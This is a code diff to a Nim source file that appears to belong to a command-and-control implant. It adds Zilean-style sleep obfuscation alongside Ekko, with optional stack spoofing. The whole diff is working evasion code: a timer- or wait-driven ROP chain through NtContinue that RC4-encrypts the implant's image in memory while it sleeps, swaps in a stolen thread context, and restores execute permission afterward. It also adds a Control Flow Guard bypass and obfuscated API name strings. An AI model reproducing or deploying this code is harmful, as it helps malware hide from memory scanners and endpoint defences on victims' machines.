@@ -1,7 +1,9 @@
 import winim/lean
 import winim/inc/tlhelp32
 import os, system, strformat
-import ../../common/[types, utils, crypto] 
+
+import ./cfg 
+import ../../common/[types, utils, crypto]
 
 # Sleep obfuscation implementation based on Ekko, originally developed by C5pider 
 # The code in this file was taken from the MalDev Academy modules 54, 56 & 59 and translated from C to Nim
@@ -18,11 +20,15 @@ type
         NotificationEvent, 
         SynchronizationEvent
 
+    WAIT_CALLBACK_ROUTINE = proc(Parameter: PVOID, TimerOrWaitFired: BOOLEAN): VOID 
+    PWAIT_CALLBACK_ROUTINE = ptr WAIT_CALLBACK_ROUTINE
+
 # Required APIs (definitions taken from NtDoc)
 proc RtlCreateTimerQueue*(phTimerQueueHandle: PHANDLE): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimerQueue"), dynlib: protect("ntdll.dll").}
 proc RtlDeleteTimerQueue(hQueue: HANDLE): NTSTATUS {.cdecl, stdcall, importc: protect("RtlDeleteTimerQueue"), dynlib: protect("ntdll.dll").}
 proc NtCreateEvent*(phEvent: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, eventType: EVENT_TYPE, initialState: BOOLEAN): NTSTATUS {.cdecl, stdcall, importc: protect("NtCreateEvent"), dynlib: protect("ntdll.dll").}
 proc RtlCreateTimer(queue: HANDLE, hTimer: PHANDLE, function: FARPROC, context: PVOID, dueTime: ULONG, period: ULONG, flags: ULONG): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimer"), dynlib: protect("ntdll.dll").}
+proc RtlRegisterWait( hWait: PHANDLE, handle: HANDLE, function: PWAIT_CALLBACK_ROUTINE, ctx: PVOID, ms: ULONG, flags: ULONG): NTSTATUS  {.cdecl, stdcall, importc: protect("RtlRegisterWait"), dynlib: protect("ntdll.dll").}
 proc NtSignalAndWaitForSingleObject(hSignal: HANDLE, hWait: HANDLE, alertable: BOOLEAN, timeout: PLARGE_INTEGER): NTSTATUS {.cdecl, stdcall, importc: protect("NtSignalAndWaitForSingleObject"), dynlib: protect("ntdll.dll").}
 proc NtDuplicateObject(hSourceProcess: HANDLE, hSource: HANDLE, hTargetProcess: HANDLE, hTarget: PHANDLE, desiredAccess: ACCESS_MASK, attributes: ULONG, options: ULONG ): NTSTATUS {.cdecl, stdcall, importc: protect("NtDuplicateObject"), dynlib: protect("ntdll.dll").}
 proc NtSetEvent(hEvent: HANDLE, previousState: PLONG): NTSTATUS {.cdecl, stdcall, importc: protect("NtSetEvent"), dynlib: protect("ntdll.dll").}
@@ -62,13 +68,18 @@ proc GetRandomThreadCtx(): CONTEXT =
                 continue
 
             echo fmt"[*] Using thread {thd32Entry.th32ThreadID} for stack spoofing."
-            break     
+            break  
 
     return ctx
 
 # Ekko sleep obfuscation with stack spoofing 
-proc sleepEkko*(sleepDelay: int) = 
+proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = EKKO, spoofStack: bool = true) = 
     
+    echo fmt"[*] Using {$mode} for sleep obfuscation [Stack duplication: {$spoofStack}]."
+
+    if sleepDelay == 0: 
+        return 
+
     var 
         status: NTSTATUS = 0
         img: USTRING = USTRING(Length: 0)
@@ -78,12 +89,13 @@ proc sleepEkko*(sleepDelay: int) =
         ctxBackup: CONTEXT
         ctxSpoof: CONTEXT 
         hThread: HANDLE
-        hEvent: HANDLE
+        hEventTimer: HANDLE
+        hEventWait: HANDLE
         hEventStart: HANDLE
         hEventEnd: HANDLE
         queue: HANDLE
         timer: HANDLE 
-        value: DWORD = 0
+        oldProtection: DWORD = 0
         delay: DWORD = 0
     
     try: 
@@ -91,11 +103,14 @@ proc sleepEkko*(sleepDelay: int) =
             NtContinue = GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtContinue"))
             SystemFunction032 = GetProcAddress(LoadLibraryA(protect("Advapi32")), protect("SystemFunction032"))
 
+        # Add NtContinue to the Control Flow Guard allow list to make Ekko work in processes protected by CFG
+        discard evadeCFG(NtContinue)
+
         # Locate image base and size
         var imageBase = GetModuleHandleA(NULL)
         var imageSize = (cast[PIMAGE_NT_HEADERS](imageBase + (cast[PIMAGE_DOS_HEADER](imageBase)).e_lfanew)).OptionalHeader.SizeOfImage
         # echo fmt"[+] Image base at: 0x{cast[uint64](imageBase).toHex()} ({imageSize} bytes)"
-        
+
         img.Buffer = cast[PVOID](imageBase)
         img.Length = imageSize
 
@@ -104,128 +119,177 @@ proc sleepEkko*(sleepDelay: int) =
         key.Buffer = keyBuffer.addr
         key.Length = cast[DWORD](keyBuffer.len())
 
-        # Sleep obfuscation implementation using NTAPI
+        # Sleep obfuscation implementation using Windows Native API functions 
         # Create timer queue
-        status = RtlCreateTimerQueue(addr queue) 
-        if status != STATUS_SUCCESS:
-            raise newException(CatchableError, $status.toHex())
-        defer: discard RtlDeleteTimerQueue(queue)
+        if mode == EKKO:
+            status = RtlCreateTimerQueue(addr queue) 
+            if status != STATUS_SUCCESS:
+                raise newException(CatchableError, "RtlCreateTimerQueue " & $status.toHex())
 
         # Create events
-        status = NtCreateEvent(addr hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
+        status = NtCreateEvent(addr hEventTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, $status.toHex())
-        defer: CloseHandle(hEvent)
+            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
+
+        if mode == ZILEAN:
+            status = NtCreateEvent(addr hEventWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
+            if status != STATUS_SUCCESS:
+                raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
 
         status = NtCreateEvent(addr hEventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, $status.toHex())
-        defer: CloseHandle(hEventStart)
+            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
 
         status = NtCreateEvent(addr hEventEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, $status.toHex())
-        defer: CloseHandle(hEventEnd)
+            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
 
-        # Retrieve a random thread context from the current process
-        ctxSpoof = GetRandomThreadCtx() 
+        if mode == EKKO: 
+            # Retrieve the initial thread context
+            delay += 100
+            status = RtlCreateTimer(queue, addr timer, RtlCaptureContext, addr ctxInit, delay, 0, WT_EXECUTEINTIMERTHREAD)
+            if status != STATUS_SUCCESS: 
+                raise newException(CatchableError, "RtlCreateTimer/RtlCaptureContext " & $status.toHex())
 
-        # Retrieve the initial thread context
-        status = RtlCreateTimer(queue, addr timer, RtlCaptureContext, addr ctxInit, 0, 0, WT_EXECUTEINTIMERTHREAD)
+            # Wait until RtlCaptureContext is successfully completed to prevent a race condition from forming
+            delay += 100
+            status = RtlCreateTimer(queue, addr timer, SetEvent, cast[PVOID](hEventTimer), delay, 0, WT_EXECUTEINTIMERTHREAD)
+            if status != STATUS_SUCCESS:
+                raise newException(CatchableError, "RtlCreateTimer/SetEvent " & $status.toHex())
+
+        elif mode == ZILEAN:
+            delay += 100
+            status = RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](RtlCaptureContext), addr ctxInit, delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
+            if status != STATUS_SUCCESS: 
+                raise newException(CatchableError, "RtlRegisterWait/RtlCaptureContext " & $status.toHex())
+
+            delay += 100
+            status = RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](SetEvent), cast[PVOID](hEventTimer), delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
+            if status != STATUS_SUCCESS:
+                raise newException(CatchableError, "RtlRegisterWait/SetEvent " & $status.toHex())
+
+        # Wait for events to finish before continuing 
+        status = NtWaitForSingleObject(hEventTimer, FALSE, NULL)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, $status.toHex())
+            raise newException(CatchableError, "NtWaitForSingleObject " & $status.toHex())
 
-        # Wait until RtlCaptureContext is successfully completed to prevent a race condition from forming
-        status = RtlCreateTimer(queue, addr timer, SetEvent, addr hEvent, 0, 0, WT_EXECUTEINTIMERTHREAD)
-        if status != STATUS_SUCCESS:
-            raise newException(CatchableError, $status.toHex())
-
-        WaitForSingleObject(hEvent, 1000)
-
-        # Create handle to the current process
-        status = NtDuplicateObject(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), addr hThread, THREAD_ALL_ACCESS, 0, 0)
-        if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, $status.toHex())
-        defer: CloseHandle(hThread)
+        if spoofStack: 
+            # Stack duplication
+            # Create handle to the current process
+            # Retrieve a random thread context from the current process
+            ctxSpoof = GetRandomThreadCtx() 
+            status = NtDuplicateObject(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), addr hThread, THREAD_ALL_ACCESS, 0, 0)
+            if status != STATUS_SUCCESS: 
+                raise newException(CatchableError, "NtDuplicateObject " & $status.toHex())
 
         # Preparing the ROP chain 
         # Initially, each element in this array will have the same context as the timer's thread context
         for i in 0 ..< ctx.len(): 
             copyMem(addr ctx[i], addr ctxInit, sizeof(CONTEXT))
-            dec(ctx[i].Rsp, 8) # Stack alignment, due to the RSP register being incremented by the size of a pointer
+            dec(ctx[i].Rsp, sizeof(PVOID)) # Stack alignment, due to the RSP register being incremented by the size of a pointer
         
+        var gadget = 0
+
         # ROP Chain
         # ctx[0] contains the call to WaitForSingleObjectEx, which waits for a signal to start and execute the rest of the chain.
-        ctx[0].Rip = cast[DWORD64](WaitForSingleObjectEx)
-        ctx[0].Rcx = cast[DWORD64](hEventStart)
-        ctx[0].Rdx = cast[DWORD64](INFINITE)
-        ctx[0].R8  = cast[DWORD64](NULL)
+        ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
+        ctx[gadget].Rcx = cast[DWORD64](hEventStart)
+        ctx[gadget].Rdx = cast[DWORD64](INFINITE)
+        ctx[gadget].R8  = cast[DWORD64](FALSE)
+        inc gadget
 
         # ctx[1] contains the call to VirtualProtect, which changes the protection of the payload image memory to [RW-]
-        ctx[1].Rip = cast[DWORD64](VirtualProtect)
-        ctx[1].Rcx = cast[DWORD64](imageBase)
-        ctx[1].Rdx = cast[DWORD64](imageSize)
-        ctx[1].R8  = cast[DWORD64](PAGE_READWRITE)
-        ctx[1].R9  = cast[DWORD64](addr value)
+        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
+        ctx[gadget].Rcx = cast[DWORD64](imageBase)
+        ctx[gadget].Rdx = cast[DWORD64](imageSize)
+        ctx[gadget].R8  = cast[DWORD64](PAGE_READWRITE)
+        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
+        inc gadget
 
         # ctx[2] contains the call to SystemFunction032, which performs the actual payload memory obfuscation using RC4.
-        ctx[2].Rip = cast[DWORD64](SystemFunction032)
-        ctx[2].Rcx = cast[DWORD64](addr img)
-        ctx[2].Rdx = cast[DWORD64](addr key)
+        ctx[gadget].Rip = cast[DWORD64](SystemFunction032)
+        ctx[gadget].Rcx = cast[DWORD64](addr img)
+        ctx[gadget].Rdx = cast[DWORD64](addr key)
+        inc gadget
 
-        # Ctx[3] contains the call to GetThreadContext, which retrieves the payload's main thread context and saves it into the CtxBackup variable for later restoration.
-        ctxBackup.ContextFlags = CONTEXT_ALL
-        ctx[3].Rip = cast[DWORD64](GetThreadContext)
-        ctx[3].Rcx = cast[DWORD64](hThread)
-        ctx[3].Rdx = cast[DWORD64](addr ctxBackup)
+        if spoofStack:
+            # ctx[3] contains the call to GetThreadContext, which retrieves the payload's main thread context and saves it into the CtxBackup variable for later restoration.
+            ctxBackup.ContextFlags = CONTEXT_ALL
+            ctx[gadget].Rip = cast[DWORD64](GetThreadContext)
+            ctx[gadget].Rcx = cast[DWORD64](hThread)
+            ctx[gadget].Rdx = cast[DWORD64](addr ctxBackup)
+            inc gadget
 
-        # Ctx[4] contains the call to SetThreadContext that will spoof the payload thread by setting the thread context with the stolen context.
-        ctx[4].Rip = cast[DWORD64](SetThreadContext)
-        ctx[4].Rcx = cast[DWORD64](hThread)
-        ctx[4].Rdx = cast[DWORD64](addr ctxSpoof)
+            # ctx[4] contains the call to SetThreadContext that will spoof the payload thread by setting the thread context with the stolen context.
+            ctx[gadget].Rip = cast[DWORD64](SetThreadContext)
+            ctx[gadget].Rcx = cast[DWORD64](hThread)
+            ctx[gadget].Rdx = cast[DWORD64](addr ctxSpoof)
+            inc gadget
 
         # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
-        ctx[5].Rip = cast[DWORD64](WaitForSingleObjectEx)
-        ctx[5].Rcx = cast[DWORD64](GetCurrentProcess())
-        ctx[5].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
-        ctx[5].R8  = cast[DWORD64](FALSE)
+        ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
+        ctx[gadget].Rcx = cast[DWORD64](GetCurrentProcess())
+        ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
+        ctx[gadget].R8  = cast[DWORD64](FALSE)
+        inc gadget
         
         # ctx[6] contains the call to SystemFunction032 to decrypt the previously encrypted payload memory
-        ctx[6].Rip = cast[DWORD64](SystemFunction032)
-        ctx[6].Rcx = cast[DWORD64](addr img)
-        ctx[6].Rdx = cast[DWORD64](addr key)
+        ctx[gadget].Rip = cast[DWORD64](SystemFunction032)
+        ctx[gadget].Rcx = cast[DWORD64](addr img)
+        ctx[gadget].Rdx = cast[DWORD64](addr key)
+        inc gadget
 
-        # Ctx[7] calls SetThreadContext to restore the original thread context from the previously saved CtxBackup.
-        ctx[7].Rip = cast[DWORD64](SetThreadContext)
-        ctx[7].Rcx = cast[DWORD64](hThread)
-        ctx[7].Rdx = cast[DWORD64](addr ctxBackup)
+        if spoofStack: 
+            # ctx[7] calls SetThreadContext to restore the original thread context from the previously saved CtxBackup.
+            ctx[gadget].Rip = cast[DWORD64](SetThreadContext)
+            ctx[gadget].Rcx = cast[DWORD64](hThread)
+            ctx[gadget].Rdx = cast[DWORD64](addr ctxBackup)
+            inc gadget
 
-        # ctx[5] contains the call to VirtualProtect to change the payload memory back to [R-X]
-        ctx[8].Rip = cast[DWORD64](VirtualProtect)
-        ctx[8].Rcx = cast[DWORD64](imageBase)
-        ctx[8].Rdx = cast[DWORD64](imageSize)
-        ctx[8].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
-        ctx[8].R9  = cast[DWORD64](addr value)
+        # ctx[8] contains the call to VirtualProtect to change the payload memory back to [R-X]
+        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
+        ctx[gadget].Rcx = cast[DWORD64](imageBase)
+        ctx[gadget].Rdx = cast[DWORD64](imageSize)
+        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
+        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
+        inc gadget
         
-        # ctx[6] contains the call to the SetEvent WinAPI that will set hEventEnd event object in a signaled state. This with signal that the obfuscation chain is complete
-        ctx[9].Rip = cast[DWORD64](NtSetEvent)
-        ctx[9].Rcx = cast[DWORD64](hEventEnd)
-        ctx[9].Rdx = cast[DWORD64](NULL)
+        # ctx[9] contains the call to the SetEvent WinAPI that will set hEventEnd event object in a signaled state. This with signal that the obfuscation chain is complete
+        ctx[gadget].Rip = cast[DWORD64](NtSetEvent)
+        ctx[gadget].Rcx = cast[DWORD64](hEventEnd)
+        ctx[gadget].Rdx = cast[DWORD64](NULL)
 
         # Executing timers
-        for i in 0 ..< ctx.len(): 
+        for i in 0 .. gadget: 
             delay += 100
-            status = RtlCreateTimer(queue, addr timer, NtContinue, addr ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD)
-            if status != STATUS_SUCCESS: 
-                raise newException(CatchableError, $status.toHex())
+
+            if mode == EKKO:
+                status = RtlCreateTimer(queue, addr timer, NtContinue, addr ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD)
+                if status != STATUS_SUCCESS: 
+                    raise newException(CatchableError, "RtlCreateTimer/NtContinue " & $status.toHex())
             
+            elif mode == ZILEAN: 
+                status = RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](NtContinue), addr ctx[i], delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
+                if status != STATUS_SUCCESS: 
+                    raise newException(CatchableError, "RtlRegisterWait/NtContinue " & $status.toHex())
+
         echo protect("[*] Triggering sleep obfuscation.")
 
         status = NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
-
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, $status.toHex())
+            raise newException(CatchableError, "NtSignalAndWaitForSingleObject " & $status.toHex())
+
+        echo protect("[*] Ending sleep obfuscation.")
 
     except CatchableError as err: 
         sleep(sleepDelay)
         echo protect("[-] "), err.msg
+        
+    finally:
+        # Cleanup 
+        if queue != 0: discard RtlDeleteTimerQueue(queue)
+        if hEventTimer != 0: CloseHandle(hEventTimer)
+        if hEventWait != 0: CloseHandle(hEventWait)
+        if hEventStart != 0: CloseHandle(hEventStart)
+        if hEventEnd != 0: CloseHandle(hEventEnd)
+        if hThread != 0: CloseHandle(hThread)
